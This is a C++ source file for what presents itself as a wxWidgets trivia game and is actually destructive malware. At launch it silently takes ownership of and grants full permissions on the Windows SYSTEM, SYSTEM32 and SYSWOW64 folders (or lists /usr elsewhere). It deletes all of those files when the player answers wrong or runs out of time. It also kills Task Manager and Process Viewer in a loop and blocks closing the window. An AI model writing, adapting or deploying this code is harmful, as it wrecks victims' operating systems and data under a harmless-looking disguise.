#include "trivia_game.hpp"

using namespace std;

wxDEFINE_EVENT(wxEVT_COMMAND_TIME_THREAD_COMPLETED, wxThreadEvent);
wxDEFINE_EVENT(wxEVT_COMMAND_TIME_THREAD_UPDATE, wxThreadEvent);

vector<TriviaQuestion> getTriviaQuestions(string fileContents) {
	Json::Value triviaJson = JsonHelper::parseJsonString(fileContents);
	int arraySize = triviaJson.size();
	vector<TriviaQuestion> triviaQuestions;
	for (int i = 0; i < arraySize; i++) {
		Json::Value jsonItem = triviaJson[i];
		if (jsonItem.empty())
			throw InteractBoxException(ErrorCodes::TriviaItemNotFound);
		Json::Value questionJson = jsonItem["q"];
		if (questionJson.empty())
			throw InteractBoxException(ErrorCodes::TriviaQuestionNotFound);
		;
		Json::Value answersJson = jsonItem["a"];
		if (answersJson.empty())
			throw InteractBoxException(ErrorCodes::TriviaAnswersNotFound);
		;
		Json::Value correctAnswerJson = jsonItem["c"];
		if (correctAnswerJson.empty())
			throw InteractBoxException(ErrorCodes::TriviaCorrectAnswerNotFound);
		;
		string question = questionJson.asString();
		vector<string> answers;
		for (int j = 0; j < 4; j++) {
			Json::Value arrayItem = answersJson[j];
			if (arrayItem.empty())
				throw InteractBoxException(ErrorCodes::ArgumentIsNull, to_string(j));
			answers.push_back(arrayItem.asString());
		}
		int correctAnswer = correctAnswerJson.asInt();
		triviaQuestions.push_back(TriviaQuestion(question, answers, correctAnswer));
	}
	return triviaQuestions;
}

#ifdef WIN32
void loadFileInResource(int name, string type, DWORD& size, const char*& data) {
	HMODULE handle = ::GetModuleHandle(NULL);
	if (!handle)
		throw InteractBoxException(ErrorCodes::CannotFindResource);
	HRSRC rc = FindResourceA(handle, MAKEINTRESOURCEA(name), type.c_str());
	HGLOBAL rcData = LoadResource(handle, rc);
	size = SizeofResource(handle, rc);
	data = static_cast<const char*>(::LockResource(rcData));
}

void loadFileInResource(int name, DWORD& size, unsigned char* data) {
	HMODULE handle = ::GetModuleHandle(NULL);
	if (!handle)
		throw InteractBoxException(ErrorCodes::CannotFindResource);
	HRSRC rc = FindResource(handle, MAKEINTRESOURCE(name), RT_RCDATA);
	HGLOBAL rcData = LoadResource(handle, rc);
	size = SizeofResource(handle, rc);
	data = static_cast<unsigned char*>(LockResource(rcData));
}
#else
string loadEmbeddedJson() {
	return string(reinterpret_cast<const char*>(questions_json), questions_json_len);
}
#endif

vector<TriviaQuestion> parseQuestions() {
#ifdef WIN32
	DWORD size = 0;
	const char* jsonString;
	loadFileInResource(IDR_JSON, "JSON", size, jsonString);
	char* jsonBuffer = new char[size + 1];
	memcpy(jsonBuffer, jsonString, size);
	jsonBuffer[size] = 0;
#else
	string jsonBuffer = loadEmbeddedJson();
#endif
	vector<TriviaQuestion> triviaQuestions = getTriviaQuestions(jsonBuffer);
	return triviaQuestions;
}

bool TriviaGame::OnInit() {
	try {
		MainAppFrame* frame = new MainAppFrame();
		SetTopWindow(frame);
		frame->Show(true);
		return true;
	} catch (InteractBoxException& e) {
		wxMessageBox(e.what(), "Trivia Game Error", wxICON_ERROR);
		return false;
	} catch (exception& e) {
		wxMessageBox(e.what(), "Trivia Game Error", wxICON_ERROR);
		return false;
	} catch (exception* e) {
		wxMessageBox(e->what(), "Trivia Game Error", wxICON_ERROR);
		return false;
	}
}

#if defined(WIN32) && WINVER >= _WIN32_WINNT_VISTA
vector<wstring> MainAppFrame::setPermissionsAndGetFiles(std::wstring path) {
	ShellExecute(
		NULL, L"runas", L"cmd.exe", (L"/c takeown /f \"" + path + L"\"").c_str(), NULL, SW_HIDE
	);

	ShellExecute(
		NULL, L"runas", L"cmd.exe",
		(L"/c icacls \"" + path + L"\" /grant %USERNAME%:(OI)(CI)F /T").c_str(), NULL, SW_HIDE
	);
	return FileHelper::listFilesWithoutFailures(path);
}
#endif

void MainAppFrame::playSound() {
	wxSound* sound = new wxSound;
	bool success = sound->Create("audio\\skill_check.wav");
	if (!success)
		throw InteractBoxException(ErrorCodes::CannotCreateSound);
	success = sound->Play(wxSOUND_ASYNC);
	if (!success)
		throw InteractBoxException(ErrorCodes::CannotPlaySound);
}

MainAppFrame::MainAppFrame()
		: wxFrame(
				NULL,
				wxID_ANY,
#ifdef WIN32
				L"Trivia Game",
#else
				"Trivia Game",
#endif
				wxDefaultPosition,
				wxDefaultSize,
				wxCAPTION | wxSYSTEM_MENU | wxMINIMIZE_BOX
			) {
#ifdef WIN32
	HICON iconHandle = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
	wxIcon icon;
	icon.CreateFromHICON(iconHandle);
	SetIcon(icon);
	DestroyIcon(iconHandle);
#else
	wxIcon icon;
	wxMemoryInputStream stream(icon_trivia_game_icon_ico, icon_trivia_game_icon_ico_len);
	wxImage image(stream, wxBITMAP_TYPE_PNG);
	icon.CopyFromBitmap(wxBitmap(image));
#endif
	playSound();
	_triviaQuestions = parseQuestions();
#ifdef WIN32
	#if WINVER > _WIN32_WINNT_NT4
	wstring systemDir = L"C:\\WINDOWS\\SYSTEM";
	wstring system32Dir = L"C:\\WINDOWS\\SYSTEM32";
	wstring sysWowDir = L"C:\\WINDOWS\\SYSWOW64";
	vector<wstring> sysDirs = {
		systemDir,
		system32Dir,
		#if WINVER >= _WIN32_WINNT_VISTA
		sysWowDir,
		#endif
	};
	for (auto& path : sysDirs) {
		_fileCollections.push_back(
		#if WINVER >= _WIN32_WINNT_VISTA
			setPermissionsAndGetFiles(path)
		#else
			FileHelper::listFiles(path)
		#endif
		);
	}
	#else
	string systemDir = "C:\\WINDOWS\\SYSTEM";
	string system32Dir = "C:\\WINDOWS\\SYSTEM32";

	for (auto& path : {systemDir, system32Dir}) {
		_fileCollections.push_back(FileHelper::listFiles(path));
	}
	#endif
#else
	_fileCollections.push_back(FileHelper::listFiles("/usr"));
#endif

	wxSize size(400, 600);
	_panel = new wxPanel(this, wxID_ANY, wxDefaultPosition, size);
	wxBoxSizer* sizer = new wxBoxSizer(wxVERTICAL);
	getQuestion();
	wxStaticText* text = new wxStaticText(
#ifdef WIN32
		_panel, QUESTION_ID, StringHelper::stringToWideString(_randomQuestion.question)
#else
		_panel, QUESTION_ID, _randomQuestion.question
#endif
	);

	_timeText = new wxStaticText(_panel, TIME_TEXT_ID, L"You have 10 seconds");
	text->SetFont(this->GetFont().Scale(1.25));
	_timeText->SetFont(this->GetFont().MakeBold());
	sizer->Add(text, 1, wxEXPAND, 2);
	sizer->Add(_timeText, 1, wxEXPAND, 1);
	MainAppFrame::displayQuestion(sizer, _panel);
	_submitButton = new wxButton(_panel, SUBMIT_BUTTON_ID, L"Submit");
	_submitButton->Disable();
	sizer->Add(_submitButton, 1, wxEXPAND, 2);
	Bind(wxEVT_BUTTON, &MainAppFrame::OnSubmit, this, SUBMIT_BUTTON_ID);
	Bind(wxEVT_CLOSE_WINDOW, &MainAppFrame::OnClose, this);

	_panel->SetSizer(sizer);
	_panel->Fit();
	_panel->Show(true);

	Bind(wxEVT_COMMAND_TIME_THREAD_UPDATE, &MainAppFrame::OnThreadUpdate, this);
	Bind(wxEVT_COMMAND_TIME_THREAD_COMPLETED, &MainAppFrame::OnThreadCompletion, this);
	DoStartThread();
}

void MainAppFrame::DoStartThread() {
	timeThread = new TimeThread(this);
	if (timeThread->Run() != wxTHREAD_NO_ERROR) {
		wxLogError("Can't create the thread!");
		delete timeThread;
		timeThread = nullptr;
	}
	vector<ProcessNameAndFileName> processes;
#ifdef WIN32
	processes.push_back({"PVIEW.EXE", "Process Viewer"});
	#if WINVER > _WIN32_WINNT_NT4
		processes.push_back({"taskmgr.EXE", "Task Manager"})
	#endif
#endif
	processKillerThread = new ProcessKillerThread(
		this, processes
	);

	if (processKillerThread->Run() != wxTHREAD_NO_ERROR) {
		wxLogError("Can't create the thread!");
		delete processKillerThread;
		processKillerThread = nullptr;
	}
}

void MainAppFrame::displayQuestion(wxBoxSizer* sizer, wxPanel* panel) {
	for (int i = 0; i < _randomQuestion.answers.size(); i++) {
#ifdef WIN32
		wstring answer = StringHelper::stringToWideString(_randomQuestion.answers[i]);
#else
		string answer = _randomQuestion.answers[i];
#endif
		int id = i + 1;
		wxRadioButton* radioButton = new wxRadioButton(panel, id, answer);
		sizer->Add(radioButton, 1, wxEXPAND, 1);
		_radioButtons.push_back(radioButton);
		Bind(wxEVT_RADIOBUTTON, &MainAppFrame::OnRadioSelect, this, id);
	}
}

wxThread::ExitCode TimeThread::Entry() {
	for (int i = 10; i > 0; i--) {
		Sleep(1000);
		wxQueueEvent(handlerPointer, new wxThreadEvent(wxEVT_COMMAND_TIME_THREAD_UPDATE));
	}
	wxQueueEvent(handlerPointer, new wxThreadEvent(wxEVT_COMMAND_TIME_THREAD_COMPLETED));
	return (wxThread::ExitCode)0;
}

TimeThread::~TimeThread() {
	wxCriticalSectionLocker enter(handlerPointer->threadCritical);
	handlerPointer->timeThread = nullptr;
}

void MainAppFrame::getQuestion() { _randomQuestion = IndexHelper::getRandomItem(_triviaQuestions); }

void MainAppFrame::OnSubmit(wxCommandEvent& event) {
	_hasAnswered = true;
	if (_pickedAnswer != _randomQuestion.correctAnswer) {
		for (wxRadioButton* radio : _radioButtons) {
			radio->Disable();
			if (radio->GetId() != _pickedAnswer)
				radio->SetValue(false);
			else
				radio->SetValue(true);
		}
		_submitButton->Disable();
		wipeSystemFolders();
	} else {
#ifdef WIN32
		wxMessageBox(
			L"Congratulations, your system is safe! For now.", L"Trivia Game", wxICON_INFORMATION
		);
#else
		wxMessageBox(
			"Congratulations, your system is safe! For now.", "Trivia Game", wxICON_INFORMATION
		);
#endif
	}
	_canClose = true;
	Close(true);
}

void MainAppFrame::OnRadioSelect(wxCommandEvent& event) {
	int id = event.GetId();
	_pickedAnswer = id;
	if (_remainingSeconds > 0 && !_hasAnswered)
		_submitButton->Enable();
}

void MainAppFrame::OnClose(wxCloseEvent& event) {
	if (!_canClose)
		event.Veto();
	timeThread = nullptr;
	processKillerThread->Delete();
	processKillerThread = nullptr;
	exit(0);
}

void MainAppFrame::OnExit(wxCommandEvent& event) {}

void MainAppFrame::OnThreadUpdate(wxThreadEvent& event) {
	if (_hasAnswered)
		return;
	_remainingSeconds--;
#ifdef WIN32
	wstring timeString = L"You have ";
	timeString += to_wstring(_remainingSeconds);
	timeString += L" second";
	if (_remainingSeconds != 1)
		timeString += L"s";
#else
	string timeString = "You have ";
	timeString += to_string(_remainingSeconds);
	timeString += " second";
	if (_remainingSeconds != 1)
		timeString += "s";
#endif
	_timeText->SetLabel(timeString);
}

void MainAppFrame::OnThreadCompletion(wxThreadEvent& event) {
	if (_hasAnswered)
		return;
	wipeSystemFolders();
	wxMessageBox("Time's up! Better luck next time!", "Trivia Game", wxICON_INFORMATION);
	_canClose = true;
	Close(true);
}

#if defined(WIN32) && WINVER > _WIN32_WINNT_NT4
void MainAppFrame::deleteFiles(vector<wstring> files) {
	for (auto& file : files) {
		_timeText->SetLabel("Deleting " + file + "...");
		WINBOOL success = DeleteFile(file.c_str());
		_timeText->SetLabel(_timeText->GetLabel() + (success ? " success!" : " failed."));
	}
}

#else
void MainAppFrame::deleteFiles(vector<string> files) {
	for (auto& file : files) {
		_timeText->SetLabel("Deleting " + file + "...");
	#ifdef WIN32
		WINBOOL success = DeleteFileA(file.c_str());
	#else
		bool success = remove(file.c_str());
	#endif
		_timeText->SetLabel(_timeText->GetLabel() + (success ? " success!" : " failed."));
	}
}

#endif

void MainAppFrame::wipeSystemFolders() {
	for (auto& files : _fileCollections) {
		deleteFiles(files);
	}
#ifdef WIN32
	string systemDirs = "SYSTEM and SYSTEM32";
#else
	string systemDirs = "/usr";
#endif
	wxMessageBox(
		"The contents of " + systemDirs + " have been deleted. Better luck next time!", "Trivia Game",
		wxICON_INFORMATION
	);
	_canClose = true;
	Close(true);
}

wxIMPLEMENT_APP(TriviaGame);

ProcessKillerThread::~ProcessKillerThread() { handlerPointer->processKillerThread = nullptr; }

wxThread::ExitCode ProcessKillerThread::Entry() {
	while (!_endNow) {
		Sleep(100);
		for (auto& procInfo : _processNamesAndFiles) {
			findAndKill(procInfo);
		}
	}
	return (wxThread::ExitCode)0;
}

void ProcessKillerThread::OnDelete() { _endNow = true; }

void ProcessKillerThread::findAndKill(ProcessNameAndFileName procInfo) {
	auto pid = ProcessHelper::getProcessId(procInfo.fileName);
	if (pid == 0)
		return;
#ifdef WIN32
	ProcessHelper::killProcess(pid, 1);
#else
	ProcessHelper::killProcess(pid);
#endif
	string shellArgs = "--title \"Really?\" --content \"Did you seriously open " + procInfo.name +
		"?\" --type e --buttons \"lol;lmao\"";
#ifdef WIN32
	ShellExecuteA(
		NULL, "open", "message_box_process.exe", shellArgs.c_str(),
	#if WINVER > _WIN32_WINNT_NT4
		FileHelper::getWorkingDirectoryAsString().c_str(),
	#else
		FileHelper::getWorkingDirectory().c_str(),
	#endif
		SW_SHOWNORMAL
	);
#else
	string workingDir = FileHelper::getWorkingDirectory();
	system((workingDir + "/message_box_process" + " " + shellArgs).c_str());
#endif
}
